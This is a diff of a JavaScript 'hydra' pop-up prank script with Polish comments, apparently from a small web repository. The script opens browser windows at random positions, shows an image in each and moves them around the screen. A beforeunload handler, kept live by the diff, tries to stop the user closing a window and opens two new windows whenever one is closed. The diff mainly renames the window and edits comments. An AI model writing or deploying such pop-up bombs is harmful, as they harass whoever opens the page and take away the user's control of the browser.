@@ -55,10 +55,10 @@ document.addEventListener('click', function() {
 
 function openWindow() {
     const { x, y } = getRandomCoords();
-    const uniqueName = "hydra_" + Math.random().toString(36).substring(7);
     const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
     
-    const win = window.open(window.location.pathname, uniqueName, opts);
+    // Stała nazwa okna
+    const win = window.open(window.location.pathname, "hydra", opts);
 
     if (!win) {
         alert("Pop-upy są zablokowane! Zezwól na nie w ustawieniach paska adresu.");
@@ -67,11 +67,7 @@ function openWindow() {
 
     wins.push(win);
 
-    // --- Dodanie treści do nowego okna ---
-    // Usuwamy ponowne deklarowanie const
-    // const win = window.open("", "", "width=800,height=600"); <-- usunięte
-    // Stylowanie i wstawianie obrazu w już otwartym oknie 'win'
-
+    // --- Stylowanie i dodawanie obrazu ---
     const body = win.document.body;
     body.style.margin = "0";
     body.style.background = "black";
@@ -84,9 +80,8 @@ function openWindow() {
     body.style.fontFamily = "sans-serif";
     body.style.textAlign = "center";
     
-    // utworzenie obrazu
     const img = win.document.createElement("img");
-    img.src = "kowciu.jpg";
+    img.src = "kowciu.jpg"; // upewnij się, że plik istnieje w repo
     img.alt = "Obraz";
     img.style.width = "80%";
     img.style.maxWidth = "100vw";
@@ -95,21 +90,21 @@ function openWindow() {
     
     body.appendChild(img);
 
-    // Aktywacja ruchu (jeśli funkcja istnieje)
+    // Ruch okna
     if (typeof startMovingWindow === 'function') {
         startMovingWindow(win);
     }
 
-    // --- MECHANIZM HYDRY ---
+    // Hydrauliczny mechanizm (hydra)
     win.addEventListener("beforeunload", function (e) {
         e.preventDefault();
         e.returnValue = "";
 
-        // Wywołanie otwarcia dwóch nowych okien
         openWindow();
         openWindow();
     });
 }
+
 
 // Globalne ustawienia prędkości (piksele na klatkę)
 const SPEED_X = 5; 
